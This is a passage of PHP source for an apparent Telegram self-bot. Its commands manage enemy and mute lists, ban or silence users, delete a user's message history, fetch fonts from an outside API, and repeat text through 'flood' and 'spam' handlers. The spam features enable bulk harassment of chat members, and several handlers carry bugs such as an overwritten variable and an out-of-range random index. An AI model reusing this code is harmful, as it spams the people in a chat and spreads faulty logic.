                    if (preg_match("/^[\/\#\!]?(delenemy) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(delenemy) (.*)$/i", $text, $m);
                        $mee = yield $this->get_full_info($m[2]);
                        $me = $mee['User'];
                        $me_id = $me['id'];
                        $me_name = $me['first_name'];
                        if (in_array($me_id, $data['enemies'])) {
                            $k = array_search($me_id, $data['enemies']);
                            unset($data['enemies'][$k]);
                            file_put_contents("data.json", json_encode($data));
                            yield $this->contacts->unblock(['id' => $m[2]]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ᴅᴇʟᴇᴛᴇᴅ ꜰʀᴏᴍ ᴇɴᴇᴍʏ ʟɪꜱᴛ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱɴ'ᴛ ɪɴ ᴇɴᴇᴍʏʟɪꜱᴛ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(unmute) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(unmute) (.*)$/i", $text, $m);
                        $mee = yield $this->get_full_info($m[2]);
                        $me = $mee['User'];
                        $me_id = $me['id'];
                        $me_name = $me['first_name'];
                        if (in_array($me_id, $data['muted'])) {
                            $k = array_search($me_id, $data['muted']);
                            unset($data['muted'][$k]);
                            file_put_contents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ᴅᴇʟᴇᴛᴇᴅ ꜰʀᴏᴍ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱɴ'ᴛ ɪɴ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(reset enemylist)$/i", $text)) {
                        $data['enemies'] = [];
                        file_put_contents("data.json", json_encode($data));
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴇɴᴇᴍʏʟɪꜱᴛ ɪꜱ ɴᴏᴡ ᴇᴍᴘᴛʏ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(reset mutelist)$/i", $text)) {
                        $data['muted'] = [];
                        file_put_contents("data.json", json_encode($data));
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴍᴜᴛᴇʟɪꜱᴛ ɪꜱ ɴᴏᴡ ᴇᴍᴘᴛʏ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(enemylist)$/i", $text)) {
                        if (count($data['enemies']) > 0) {
                            $txxxt = "ᴇɴᴇᴍʏʟɪꜱᴛ :
";
                            $counter = 1;
                            foreach ($data['enemies'] as $ene) {
                                $mee = yield $this->get_full_info($ene);
                                $me = $mee['User'];
                                $me_name = $me['first_name'];
                                $txxxt .= "$counter: $me_name \n";
                                $counter++;
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ɴᴏ ᴇɴᴇᴍʏ!"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(mutelist)$/i", $text)) {
                        if (count($data['muted']) > 0) {
                            $txxxt = "ᴍᴜᴛᴇʟɪꜱᴛ :
";
                            $counter = 1;
                            foreach ($data['muted'] as $ene) {
                                $mee = yield $this->get_full_info($ene);
                                $me = $mee['User'];
                                $me_name = $me['first_name'];
                                $txxxt .= "$counter: $me_name \n";
                                $counter++;
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ɴᴏ ᴍᴜᴛᴇᴅ!"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(inv) (@.*)$/i", $text) && $update['_'] == "updateNewChannelMessage") {
                        preg_match("/^[\/\#\!]?(inv) (@.*)$/i", $text, $m);
                        $peer_info = yield $this->get_info($message['to_id']);
                        $peer_type = $peer_info['type'];
                        if ($peer_type == "supergroup") {
                            yield $this->channels->inviteToChannel(['channel' => $message['to_id'], 'users' => [$m[2]]]);
                        } else {
                            $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴊᴜꜱᴛ ꜱᴜᴘᴇʀɢʀᴏᴜᴘꜱ"]);
                        }
                    }


                    if (preg_match("/^[\/\#\!]?(leave)$/i", $text)) {
                        $this->messages->sendMessage(['peer' => $peer, 'message' => "Leave"]);
                        yield $this->channels->leaveChannel(['channel' => $message['to_id']]);
                    }
                    if (preg_match("/^[\/\#\!]?(flood) ([0-9]+) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(flood) ([0-9]+) (.*)$/i", $text, $m);
                        $count = $m[2];
                        $txt = $m[3];
                        if ($count >= 51) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Max Count == 50", 'parse_mode' => 'MarkDown']);
                        } else {
                            $spm = "";
                            for ($i = 1; $i <= $count; $i++) {
                                $spm .= " $txt \n";
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $spm]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(spam) ([0-9]+) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(spam) ([0-9]+) (.*)$/i", $text, $m);
                        $count = $m[2];
                        $txt = $m[3];
                        if ($count >= 51) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Max Count == 50", 'parse_mode' => 'MarkDown']);
                        } else {
                            for ($i = 1; $i <= $count; $i++) {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => " $txt "]);
                            }
                        }
                    }

                    if (preg_match("/^[\/\#\!]?(encode) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(encode) (.*)$/i", $text, $m);
                        $txt = $m[2];
                        $enc = base64_encode($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Encoded : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(decode) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(decode) (.*)$/i", $text, $m);
                        $txt = $m[2];
                        $enc = base64_decode($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Decoded : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(hash) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(hash) (.*)$/i", $text, $m);
                        $txt = $m[2];
                        $enc = md5($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Hashed : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(music) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(music) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@melobot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(ping) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(ping) (.*)$/i", $text, $m);
                        if ($type3 == "supergroup" || $type3 == "chat" || $type3 == "user") {
                            $mi = $m[2];
                            $r = file_get_contents("https://api.codebazan.ir/ping/?url=" . $mi);
                            if ($r != "Site is down") {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ꜱɪᴛᴇ ᴘɪɴɢ ɪꜱ <i>$r</i> !", 'parse_mode' => 'HTML', 'reply_to_msg_id' => $msg_id]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Error !", 'parse_mode' => 'markdown', 'reply_to_msg_id' => $msg_id]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(wiki) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(wiki) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@wiki", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(youtube) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(youtube) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@uVidBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(pic) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(pic) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@pic", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(meme) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(meme) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@Persian_Meme_Bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(calc) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(calc) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@MACLBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gif) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(gif) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@gif", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(blue) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(blue) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@TextMagicBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(apk) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(apk) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@apkdl_bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(sticker) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(sticker) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@big_text_bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(google) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(google) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@GoogleDEBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(joke)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(joke)$/i", $text, $m);
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@function_robot", 'peer' => $peer, 'query' => '', 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][0]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(aasab)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(aasab)$/i", $text, $m);
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@function_robot", 'peer' => $peer, 'query' => '', 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][1]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(like) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(like) (.*)$/i", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@like", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][0]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(search) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(search) (.*)$/i", $text, $m);
                        $q = $m[2];
                        $res_search = yield $this->messages->search(['peer' => $peer, 'q' => $q, 'filter' => ['_' => 'inputMessagesFilterEmpty'], 'min_date' => 0, 'max_date' => time(), 'offset_id' => 0, 'add_offset' => 0, 'limit' => 50, 'max_id' => $message['id'], 'min_id' => 1]);
                        $texts_count = count($res_search['messages']);
                        $users_count = count($res_search['users']);
                        $this->messages->sendMessage(['peer' => $peer, 'message' => "Msgs Found: $texts_count \nFrom Users Count: $users_count"]);
                        foreach ($res_search['messages'] as $text) {
                            $textid = $text['id'];
                            yield $this->messages->forwardMessages(['from_peer' => $text, 'to_peer' => $peer, 'id' => [$textid]]);
                        }
                    } else if (preg_match("/^[\/\#\!]?(ban) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(ban) (.*)$/i", $text, $m);
                        $query = $m[2];
                        if ($type3 == 'supergroup' or $type3 == 'chat') {
                            $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                            $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                            $messag = $gms['messages'][0]['from_id'];
                            $mee = yield $this->get_full_info($messag);
                            $ban = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                            $Updates = $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $ban,]);
                            $messages_AffectedHistory = $this->channels->deleteUserHistory(['channel' => $peer, 'user_id' => $messag]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "𝐓𝐡𝐞 𝐮𝐬𝐞𝐫 𝐰𝐚𝐬 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐛𝐚𝐧𝐧𝐞𝐝 ✅"]);
                        }
                    } else if (preg_match("/^[\/\#\!]?(unban) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(unban) (.*)$/i", $text, $m);
                        $query = $m[2];
                        if ($type3 == 'supergroup' or $type3 == 'chat') {
                            $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                            $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                            $messag = $gms['messages'][0]['from_id'];
                            $unban = ['_' => 'chatBannedRights', 'view_messages' => false, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 99999];
                            $Updates = $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unban,]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "𝐓𝐡𝐞 𝐮𝐬𝐞𝐫 𝐰𝐚𝐬 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝 ✅"]);
                        }
                    }


                    if (preg_match("/^[\/\#\!]?(delall) (.*)$/i", $text)) {
                        $query = $text[2];
                        if ($type3 == 'supergroup' or $type3 == 'chat') {
                            $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                            $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                            $messag = $gms['messages'][0]['from_id'];
                            $mee = yield $this->get_full_info($messag);
                            $messages_AffectedHistory = $this->channels->deleteUserHistory(['channel' => $peer, 'user_id' => $messag]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴀʟʟ ᴜꜱᴇʀ ᴍᴇꜱꜱᴀɢᴇꜱ ᴅᴇʟᴇᴛᴇᴅ✅"]);
                        }
                    } else if (preg_match("/^[\/\#\!]?(silent) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(silent) (.*)$/i", $text, $m);
                        $query = $m[2];
                        if ($type3 == 'supergroup' or $type3 == 'chat') {
                            $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                            $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                            $messag = $gms['messages'][0]['from_id'];
                            $mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                            $Updates = $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $mute,]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "𝐓𝐡𝐞 𝐮𝐬𝐞𝐫 𝐰𝐚𝐬 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐢𝐥𝐞𝐧𝐭𝐞𝐝 ✅"]);
                        }
                    } else if (preg_match("/^[\/\#\!]?(unsilent) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(unsilent) (.*)$/i", $text, $m);
                        $query = $m[2];
                        if ($type3 == 'supergroup' or $type3 == 'chat') {
                            $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                            $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                            $messag = $gms['messages'][0]['from_id'];
                            $mee = yield $this->get_full_info($messag);
                            $unmute = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 9999];
                            $Updates = $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unmute,]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "𝐓𝐡𝐞 𝐮𝐬𝐞𝐫 𝐰𝐚𝐬 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐔𝐧𝐬𝐢𝐥𝐞𝐧𝐭𝐞𝐝 ✅"]);
                        }
                    } else if (preg_match("/^[\/\#\!]?(font) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(font) (.*)$/i", $text, $m);
                        $query = $m[2];
                        $text2 = str_replace(' ', '+', $query);
                        $link = json_decode(file_get_contents("http://api.codebazan.ir/font/?text=$text2"), true);
                        $link2 = $link["result"];
                        $reza1 = $link2['1'];
                        $reza2 = $link2['2'];
                        $reza3 = $link2['3'];
                        $reza4 = $link2['4'];
                        $reza5 = $link2['5'];
                        $reza6 = $link2['6'];
                        $reza7 = $link2['7'];
                        $reza8 = $link2['8'];
                        $reza9 = $link2['9'];
                        $reza10 = $link2['10'];
                        $reza11 = $link2['11'];
                        $reza12 = $link2['12'];
                        $reza13 = $link2['13'];
                        $reza14 = $link2['14'];
                        $reza15 = $link2['15'];
                        $reza16 = $link2['16'];
                        $reza17 = $link2['17'];
                        $reza18 = $link2['18'];
                        $reza19 = $link2['19'];
                        $reza20 = $link2['20'];
                        $reza21 = $link2['21'];
                        $reza22 = $link2['22'];
                        $reza23 = $link2['23'];
                        $reza24 = $link2['24'];
                        $reza25 = $link2['25'];
                        $reza26 = $link2['26'];
                        $reza27 = $link2['27'];
                        $reza28 = $link2['28'];
                        $reza29 = $link2['29'];
                        $reza30 = $link2['30'];
                        $reza31 = $link2['31'];
                        $reza32 = $link2['32'];
                        $reza33 = $link2['33'];
                        $reza34 = $link2['34'];
                        $reza35 = $link2['35'];
                        $reza36 = $link2['36'];
                        $reza37 = $link2['37'];
                        $reza38 = $link2['38'];
                        $reza39 = $link2['39'];
                        $reza40 = $link2['40'];
                        $reza41 = $link2['41'];
                        $reza42 = $link2['42'];
                        $reza43 = $link2['43'];
                        $reza44 = $link2['44'];
                        $reza45 = $link2['45'];
                        $reza46 = $link2['46'];
                        $reza47 = $link2['47'];
                        $reza48 = $link2['48'];
                        $reza49 = $link2['49'];
                        $reza50 = $link2['50'];
                        $reza51 = $link2['51'];
                        $reza52 = $link2['52'];
                        $reza53 = $link2['53'];
                        $reza54 = $link2['54'];
                        $reza55 = $link2['55'];
                        $reza56 = $link2['56'];
                        $reza57 = $link2['57'];
                        $reza58 = $link2['58'];
                        $reza59 = $link2['59'];
                        $reza60 = $link2['60'];
                        $reza61 = $link2['61'];
                        $reza62 = $link2['62'];
                        $reza63 = $link2['63'];
                        $reza64 = $link2['64'];
                        $reza65 = $link2['65'];
                        $reza66 = $link2['66'];
                        $reza67 = $link2['67'];
                        $reza68 = $link2['68'];
                        $reza69 = $link2['69'];
                        $reza70 = $link2['70'];
                        $reza71 = $link2['71'];
                        $reza72 = $link2['72'];
                        $reza73 = $link2['73'];
                        $reza74 = $link2['74'];
                        $reza75 = $link2['75'];
                        $reza76 = $link2['76'];
                        $reza77 = $link2['77'];
                        $reza78 = $link2['78'];
                        $reza79 = $link2['79'];
                        $reza80 = $link2['80'];
                        $reza81 = $link2['81'];
                        $reza82 = $link2['82'];
                        $reza83 = $link2['83'];
                        $reza84 = $link2['84'];
                        $reza85 = $link2['85'];
                        $reza86 = $link2['86'];
                        $reza87 = $link2['87'];
                        $reza88 = $link2['88'];
                        $reza89 = $link2['89'];
                        $reza90 = $link2['90'];
                        $reza91 = $link2['91'];
                        $reza92 = $link2['92'];
                        $reza93 = $link2['93'];
                        $reza94 = $link2['94'];
                        $reza95 = $link2['95'];
                        $reza96 = $link2['96'];
                        $reza97 = $link2['97'];
                        $reza8 = $link2['98'];
                        $reza99 = $link2['99'];
                        $reza100 = $link2['100'];
                        $reza101 = $link2['101'];
                        $reza102 = $link2['102'];
                        $reza103 = $link2['103'];
                        $reza104 = $link2['104'];
                        $reza105 = $link2['105'];
                        $reza106 = $link2['106'];
                        $reza107 = $link2['107'];
                        $reza108 = $link2['108'];
                        $reza109 = $link2['109'];
                        $reza110 = $link2['110'];
                        $reza111 = $link2['111'];
                        $reza112 = $link2['112'];
                        $reza113 = $link2['113'];
                        $reza114 = $link2['114'];
                        $reza115 = $link2['115'];
                        $reza116 = $link2['116'];
                        $reza117 = $link2['117'];
                        $reza118 = $link2['118'];
                        $reza119 = $link2['119'];
                        $reza120 = $link2['120'];
                        $reza121 = $link2['121'];
                        $reza122 = $link2['122'];
                        $reza123 = $link2['123'];
                        $reza124 = $link2['124'];
                        $reza125 = $link2['125'];
                        $reza126 = $link2['126'];
                        $reza127 = $link2['127'];
                        $reza128 = $link2['128'];
                        $reza129 = $link2['129'];
                        $reza130 = $link2['130'];
                        $reza131 = $link2['131'];
                        $reza132 = $link2['132'];
                        $reza133 = $link2['133'];
                        $reza134 = $link2['134'];
                        $reza135 = $link2['135'];
                        $reza136 = $link2['136'];
                        $reza137 = $link2['137'];
                        $reza138 = $link2['138'];

                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
≡ فونت های انگلیسی کلمه $query طراحی تعداد به 138 فونت : 
⁅———— ◕ ————⁆
1 => ️<code>$reza1</code>
2 => <code>$reza2</code>
3 => <code>$reza3</code>
4 => <code>$reza4</code>
5 => <code>$reza5</code>
6 => <code>$reza6</code>
7 => <code>$reza7</code>
8 => <code>$reza8</code>
9 => <code>$reza9</code>
10 => <code>$reza10</code>
11 => <code>$reza11</code>
12 => <code>$reza12</code>
13 => <code>$reza13</code>
14 => <code>$reza14</code>
15 => <code>$reza15</code>
16 => <code>$reza16</code>
17 => <code>$reza17</code>
18 => <code>$reza18</code>
19 => <code>$reza19</code>
20 => <code>$reza20</code>
21 => <code>$reza21</code>
22 => <code>$reza22</code>
23 => <code>$reza23</code>
24 => <code>$reza24</code>
25 => <code>$reza25</code>
25 => <code>$reza26</code>
27 => <code>$reza27</code>
28 => <code>$reza28</code>
29 => <code>$reza29</code>
30 => <code>$reza30</code>
31 => <code>$reza31</code>
32 => <code>$reza32</code>
33 => <code>$reza33</code>
34 => <code>$reza34</code>
35 => <code>$reza35</code>
36 => <code>$reza36</code>
37 => <code>$reza37</code>
38 => <code>$reza38</code>
39 => <code>$reza39</code>
40 => <code>$reza40</code>
41 => <code>$reza41</code>
42 => <code>$reza42</code>
43 => <code>$reza43</code>
44 => <code>$reza44</code>
45 => <code>$reza45</code>
46 => <code>$reza46</code>
47 => <code>$reza47</code>
48 => <code>$reza48</code>
49 => <code>$reza49</code>
50 => <code>$reza50</code>
51 => <code>$reza51</code>
52 => <code>$reza52</code>
53 => <code>$reza53</code>
54 => <code>$reza54</code>
55 => <code>$reza55</code>
56 => <code>$reza56</code>
57 => <code>$reza57</code>
